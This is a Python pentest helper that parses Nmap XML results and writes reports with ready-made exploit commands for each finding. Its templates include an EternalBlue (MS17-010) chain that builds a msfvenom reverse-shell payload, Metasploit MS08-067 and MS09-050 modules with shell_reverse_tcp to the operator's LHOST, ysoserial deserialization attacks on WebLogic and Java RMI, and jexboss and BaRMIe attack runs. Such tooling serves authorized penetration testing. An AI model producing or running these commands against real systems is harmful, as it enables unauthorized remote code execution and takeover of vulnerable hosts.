#!/usr/bin/env python3

"""
Credits:
    - Markdown CSS: https://github.com/sindresorhus/github-markdown-css
    - Markdown to HTML: https://penandpants.com/2013/02/22/a-styled-html-document-from-markdown/
"""

# TODO: Parse Java-RMI
# TODO: Generate report hosts per vuln 
# TODO: store exploits in an external file 

import os
import sys
import re
import argparse
import markdown
import jinja2
import base64
import gzip
from bs4 import BeautifulSoup

RED_BOLD    = "\033[31;1m"
YELLOW_BOLD = "\033[33;1m"
BLUE_BOLD   = "\033[34;1m"
CYAN_BOLD   = "\033[36;1m"
GREEN       = "\033[32m"
GREEN_BOLD  = "\033[32;1m"
RESET       = "\033[0;0m"
BOLD        = "\033[;1m"
REVERSE     = "\033[;7m"

RISK_UNK    = 0
RISK_LOW    = 1 
RISK_MEDIUM = 2
RISK_HIGH   = 3

OUT_TERM    = 1
OUT_MD      = 2

g_lhost = "10.10.13.37"
g_lport = "1337"

class Host:
    def __init__(self, ip, hostname="", osname="", osname_accur=0):
        self.ip = ip
        self.hostname = hostname
        self.osname = osname 
        self.osname_accur = osname_accur
        self.findings = []
        self.vulns = []
    
    def __str__(self):
        ret = ""
        ret += "HOST: %s - Findinds: %d | Vulns: %d" % (self.ip, len(self.findings), len(self.vulns))
        return ret
    
    def osguess(self, oslist):
        accuracy = 0
        osname = ""
        if oslist != None:
            oss = oslist.find_all("osmatch")
            for o in oss:
                accur = int(o["accuracy"])
                if accur > accuracy:
                    accuracy = accur
                    osname = o["name"]
            self.osname = osname
            self.osname_accur = accuracy

    def parseportscan(self, ports):
        if ports != None:
            for port in ports.find_all("port"):
                portnum = int(port["portid"]) # e.g.: 1099
                proto = port["protocol"] # e.g: tcp 
                state = port.state["state"] # e.g.: open 
                if port.service != None:
                    service = port.service["name"] # e.g.: java-rmi 
                    product = ""
                    if "product" in port.service.attrs:
                        product = port.service["product"] # e.g.: Java RMI
                    hostname = ""
                    if "hostname" in port.service.attrs:
                        self.hostname = port.service["hostname"]
                    
                    if state == "open":
                        if service == "ftp":
                            scripts = port.find_all("script")
                            for script in scripts:
                                if script["id"] == "ftp-anon":
                                    if "Anonymous FTP login allowed" in script["output"]:
                                        finding = Finding(proto, portnum, service, RISK_LOW, script["output"].split('\n')[0])
                                        finding.seturl(self.ip)
                                        self.findings.append(finding)
                        elif service == "http" or service == "https":
                            if "JBoss" in product:
                                finding = Finding(proto, portnum, service, RISK_LOW, product)
                                finding.seturl(self.ip)
                                self.findings.append(finding)
                            scripts = port.find_all("script")
                            for script in scripts:
                                if script["id"] == "weblogic-t3-info":
                                    if "T3 protocol in use" in script["output"]:
                                        finding = Finding(proto, portnum, service, RISK_HIGH, script["output"])
                                        finding.seturl(self.ip)
                                        self.findings.append(finding)
                                elif script["id"] == "http-server-header":
                                    if "Apache Tomcat" in product and "Apache-Coyote" in script["output"]:
                                        finding = Finding(proto, portnum, service, RISK_LOW, product)
                                        finding.seturl(self.ip)
                                        self.findings.append(finding)
                        elif service == "ms-sql-s" or service == "ms-sql":
                            self.findings.append(Finding(proto, portnum, service, RISK_LOW, "%s - Version %s" % (port.service["product"], port.service["version"])))
                        elif service == "ms-wbt-server": # RDP / TSE
                            scripts = port.find_all("script")
                            for script in scripts:
                                if script["id"] == "rdp-vuln-ms12-020":
                                    self.parsescriptscan(port)
                        elif service == "java-rmi" or service == "rmiregistry":
                            # TODO: Parse only vulnerable endpoints
                            if product == "Java RMI":
                                self.findings.append(Finding(proto, portnum, service, RISK_LOW, "%s (%s)" % (product, service)))

    def parsescriptscan(self, hostscript):
        if hostscript != None:
            for script in hostscript:
                if script.table != None:
                    key = script.table["key"]
                    elems = script.table.find_all("elem")
                    for e in elems:
                        if "key" in e.attrs:
                            if e["key"] == "title":
                                title = e.get_text()
                            elif e["key"] == "state":
                                state = e.get_text()
                    if script["id"] == "smb-vuln-regsvc-dos":
                        pass
                    else:
                        ms_code, risk_level = helper_cve_to_mscode(key)
                        self.vulns.append(Vulnerability(key, state, title, risk=risk_level, mscode=ms_code))

class Finding:
    def __init__(self, protocol, port, service, risk, description):
        self.protocol = protocol
        self.port = port
        self.service = service
        self.risk = risk
        self.description = description
        self.url = ""
    
    def seturl(self, ip):
        self.url = "%s://%s:%s/" % (self.service, ip, self.port)
    
    def outterm(self):
        out = ""
        out += risktostr(self.risk, mode=OUT_TERM)
        out += "[%s%s%s]" % (BOLD, self.service.upper(), RESET)
        out += " %s/%s" % (self.protocol, self.port)
        out += " - %s" % (self.description)
        return out
    
    def outmarkdown(self, host):
        out = ""
        out += "### %s\n" % (self.description)
        out += "__Risk:__ %s  \n" % (risktostr(self.risk, mode=OUT_MD))
        out += "__Service:__ %s (%s/%s)  \n" % (self.service.upper(), self.protocol, self.port)
        if self.url != "":
            out += "__URL:__ [%s](%s)  \n" % (self.url, self.url)
        exploits = self.getexploits(host)
        for i in range(len(exploits)):
            out += "#### Exploit %d\n" % (i + 1)
            out += "%s  \n" % (exploits[i])
        return out 
        
    def getexploits(self, host):
        exploits = []
        if "T3 protocol in use" in self.description:
            exp = """```bash
# https://github.com/Coalfire-Research/java-deserialization-exploits
python weblogic.py --ysoserial-path ../ysoserial.jar %s:%s "ping -%s 4 %s"
tcpdump -vvv -i eth0 icmp # Check incoming ICMP request
```""" % (host.ip, self.port, "n" if "windows" in host.osname.lower() else "c", g_lhost)
            exploits.append(exp)
            exp = """```
# Check whether 'Oracle WebLogic WSAT' is available 
curl %s://%s:%s/wls-wsat/CoordinatorPortType
```""" % (self.service, host.ip, self.port)
            exploits.append(exp)
        elif "Apache Tomcat" in self.description:
            exp = """```
# Check admin URLs for default credentials:
%s/manager
%s/host-manager
%s/admin
# Test default credentials with Metasploit:
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS %s
set RPORT %s
run
```""" % (self.url,self.url,self.url, host.ip, self.port)
            exploits.append(exp)
        elif "Anonymous FTP login" in self.description:
            exp = """```bash
ftp %s %s
```""" % (host.ip, self.port)
            exploits.append(exp)
        elif "JBoss" in self.description:
            exp = """```bash
# https://github.com/joaomatosf/jexboss
python jexboss.py -u %s -r %s:%s
```""" % (self.url, g_lhost, g_lport)
            exploits.append(exp)
        elif "rmiregistry" == self.service:
            exp = """```bash
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit %s %s CommonsCollections1 "ping -%s 4 %s"
tcpdump -vvv -i eth0 icmp # Chec incoming ICMP requests
```""" % (host.ip, self.port, "n" if "windows" in host.osname.lower() else "c", g_lhost) 
            exploits.append(exp)
        elif "java-rmi" == self.service:
            exp = """```bash
# Scan the service
java -jar BaRMIe_v1.01.jar -enum %s %s
# Attack the service 
java -jar BaRMIe_v1.01.jar -attack %s %s
```""" % (host.ip, self.port, host.ip, self.port)
            exploits.append(exp) 
        return exploits
        
class Vulnerability:
    def __init__(self, name, state, description, risk=RISK_HIGH, mscode=""):
        self.name = name
        self.state = state
        self.description = description
        self.risk = risk
        self.mscode = mscode
    
    def outterm(self):
        out = ""
        out += risktostr(self.risk, mode=OUT_TERM)
        if self.mscode != "":
            out += "[%s%s%s]" % (BOLD, self.mscode, RESET)
        else:
            out += "[%s%s%s]" % (BOLD, self.name, RESET)
        out += " Status:"
        out += " %s%s%s" % (BOLD, self.state, RESET)
        out += " - %s" % (self.description)
        return out
    
    def outmarkdown(self, host):
        out = ""
        out += "### %s\n" % (self.description)
        out += "__Risk:__ %s  \n" % (risktostr(self.risk, mode=OUT_MD))
        if self.mscode != "":
            out += "__Vuln ID:__ %s (%s)  \n" % (self.mscode, self.name)
        else:
            out += "%s  \n" % (self.name)
        out += "__Status:__ %s  \n" % (self.state)
        exploits = self.getexploits(host)
        for i in range(len(exploits)):
            out += "#### Exploit %d\n" % (i + 1)
            out += "%s  \n" % (exploits[i])
        return out 
    
    def getexploits(self, host):
        exploits = []
        if self.name == "CVE-2017-0143": # MS17-010
            exp = """```bash
# https://github.com/vivami/MS17-010
cd shellcode
nasm -f bin eternalblue_kshellcode_x64.asm
msfvenom -p windows/x64/shell_reverse_tcp -f raw -o payload.bin EXITFUNC=thread LHOST=%s LPORT=%s
cat eternalblue_kshellcode_x64 payload.bin > reverse_%s_%s_x64.bin
rm payload.bin && cd ..
python eternalblue_exploit7.py %s shellcode/reverse_%s_%s_x64.bin
```""" % (g_lhost, g_lport, g_lhost, g_lport, host.ip, g_lhost, g_lport)
            exploits.append(exp)
        elif self.name == "CVE-2012-0152": # MS12-020
            pass
        elif self.name == "CVE-2009-3103": # MS09-050
            exp = """```
use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
set payload windows/shell_reverse_tcp
set RHOSTS %s
set LHOST %s
set LPORT %s
run
```""" % (host.ip, g_lhost, g_lport)
            exploits.append(exp)
        elif self.name == "CVE-2008-4250": # MS08-067
            exp = """```
use exploit/windows/smb/ms08_067_netapi
set payload windows/shell_reverse_tcp
set RHOSTS %s
set LHOST %s
set LPORT %s
run
```""" % (host.ip, g_lhost, g_lport)
            exploits.append(exp)
        return exploits

class Report:
    def __init__(self):
        self.hosts = [] 
    
    def addhost(self, host):
        self.hosts.append(host)
    
    def outterm(self):
        out = ""
        for h in self.hosts:
            out += "%sREPORT FOR HOST %s%s\n" % (BOLD, h.ip, RESET)
            out += "%s[*]%s %sHost info:%s\n" % (BLUE_BOLD, RESET, BOLD, RESET)
            if h.hostname != "":
                out += "    %sHostname:%s %s\n" % (BOLD, RESET, h.hostname)
            if h.osname != "":
                out += "    %sOS:%s %s (Accuracy: %s%s%%%s)\n" % (BOLD, RESET, h.osname, BOLD, h.osname_accur, RESET)
            if len(h.findings) > 0:
                out += "%s[*]%s %sFindings (%d):%s\n" % (BLUE_BOLD, RESET, BOLD, len(h.findings), RESET)
                for finding in h.findings:
                    out += "    %s\n" % (finding.outterm())
            if len(h.vulns) > 0:
                out += "%s[*]%s %sVulnerabilities (%d):%s\n" % (BLUE_BOLD, RESET, BOLD, len(h.vulns), RESET)
                for vuln in h.vulns:
                    out += "    %s\n" % (vuln.outterm())
            out += "\n"
        return out
    
    def outmarkdown(self):
        out = ""
        out += "# Nmap scan result\n"
        for h in self.hosts:
            out += "## %s\n" % (h.ip)
            if h.hostname != "":
                out += "__Hostname:__ %s  \n" % (h.hostname)
            if h.osname != "":
                out += "__OS:__ %s (Accuracy: __%s%%__)  \n" % (h.osname, h.osname_accur)
            if len(h.vulns) > 0:
                for vuln in h.vulns:
                    out += "%s\n" % (vuln.outmarkdown(h))
            if len(h.findings) > 0:
                for finding in h.findings:
                    out += "%s\n" % (finding.outmarkdown(h)) 
        return out
    
    def outhtml(self, outfile):
        out = ""
        script_path = os.path.dirname(os.path.realpath(__file__))
        #css_path = os.path.normpath(os.path.join(script_path, "style.css"))
        #css = open(css_path, "r").read() 
        css = gzip.decompress(base64.b64decode(g_css_compressed)).decode("utf-8") 
        extensions = ['extra', 'smarty']
        html = markdown.markdown(self.outmarkdown(), extensions=extensions, output_format='html5')
        template = """<!DOCTYPE html>
<html>
<head>
    <style>
{{css}}

	    .markdown-body {
		    box-sizing: border-box;
		    min-width: 200px;
		    max-width: 980px;
		    margin: 0 auto;
		    padding: 45px;
	    }

	    @media (max-width: 767px) {
		    .markdown-body {
			    padding: 15px;
		    }
	    }
	    
        .label {
            border-radius: 4px;
            color: white;
            padding-left: 6px;
            padding-right: 6px;
        }

        .success {background-color: #4CAF50;} /* Green */
        .info {background-color: #2196F3;} /* Blue */
        .warning {background-color: #ff9800;} /* Orange */
        .danger {background-color: #f44336;} /* Red */
        .other {background-color: #e7e7e7; color: black;} /* Gray */
    </style>
</head>
<body>
<div class="markdown-body">
{{content}}
</div>
</body>
</html>"""
        doc = jinja2.Template(template).render(css=css, content=html)
        
        try:
            f = open(outfile, "w")
            f.write(doc)
            f.close()
        except:
            print("%s[-]%s Unexpected error: '%s'" % (RED_BOLD, RESET, sys.exc_info()[0])) 
            

def risktostr(risk_level, mode=OUT_TERM):
    ret = ""
    if mode == OUT_TERM:
        if risk_level == RISK_LOW:
            ret += "[%s\u25A0  %s]" % (BLUE_BOLD, RESET)
        elif risk_level == RISK_MEDIUM:
            ret += "[%s\u25A0\u25A0 %s]" % (YELLOW_BOLD, RESET)
        elif risk_level == RISK_HIGH:
            ret += "[%s\u25A0\u25A0\u25A0%s]" % (RED_BOLD, RESET)
        elif risk_level == RISK_UNK:
            ret += "[   ]" 
    elif mode == OUT_MD:
        if risk_level == RISK_LOW:
            ret += "<span class='label info'>INFO</span>" 
        elif risk_level == RISK_MEDIUM:
            ret += "<span class='label warning'>MEDIUM</span>" 
        elif risk_level == RISK_HIGH:
            ret += "<span class='label danger'>HIGH</span>" 
        elif risk_level == RISK_UNK:
            ret += "<span class='label other'>UNKNOWN</span>" 
    return ret 

def helper_cve_to_mscode(cve):
    risk_level = RISK_UNK
    ms_code = ""
    if cve == "CVE-2017-0143": # MS17-010
        ms_code = "MS17-010"
        risk_level = RISK_HIGH
    elif cve == "CVE-2012-0152": # MS12-020
        ms_code = "MS12-020"
        risk_level = RISK_MEDIUM
    elif cve == "CVE-2009-3103":
        ms_code = "MS09-050"
        risk_level = RISK_HIGH
    elif cve == "CVE-2008-4250":
        ms_code = "MS08-067"
        risk_level = RISK_HIGH
    return ms_code, risk_level

g_css_compressed = """
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
"""

def main():

    parser = argparse.ArgumentParser(description="Nmap scan result parser")
    parser.add_argument("xml", help="XML file to parse")
    parser.add_argument("-o", action="store_true", help="Generate an HTML report")
    parser.add_argument("--lhost", help="Local IP address (used for reverse connections)", default="10.10.13.37")
    parser.add_argument("--lport", help="Local port (used for reverse connections)", default="4444")
    args = parser.parse_args()
    
    global g_lhost, g_lport
    g_lhost = args.lhost
    g_lport = args.lport
    
    try:
        f = open(args.xml, 'r')
    except FileNotFoundError:
        print("%s[-]%s File not found." % (RED_BOLD, RESET))
        return
    except:
        print("%s[-]%s Unexpected error: '%s'" % (RED_BOLD, RESET, sys.exc_info()[0]))
        return 
    
    fileext = os.path.splitext(args.xml)[1]
    if fileext != ".xml":
        print("%s[!]%s Input file doesn't have the '.xml' extension" % (YELLOW_BOLD, RESET))
    
    fc = f.read()
    soup = BeautifulSoup(fc, "xml")
    
    report = Report()
    hosts = soup.find_all("host")
    for host in hosts:
        
        host_addr = host.address["addr"]
        h = Host(host_addr)
        
        h.osguess(host.os) # Get OS name
        h.parseportscan(host.ports) # Parse ports scan result 
        h.parsescriptscan(host.hostscript) # Parse vulnerabities
        
        # If there is something to report, add host to report 
        if len(h.findings) > 0 or len(h.vulns) > 0:
            report.addhost(h)
    
    if args.o:
        filename = "%s.html" % os.path.splitext(args.xml)[0]
        report.outhtml(filename)  
        print("%s[*]%s Generated report '%s'." % (BLUE_BOLD, RESET, filename))
    else:
        print(report.outterm())

if __name__ == '__main__':
    main()


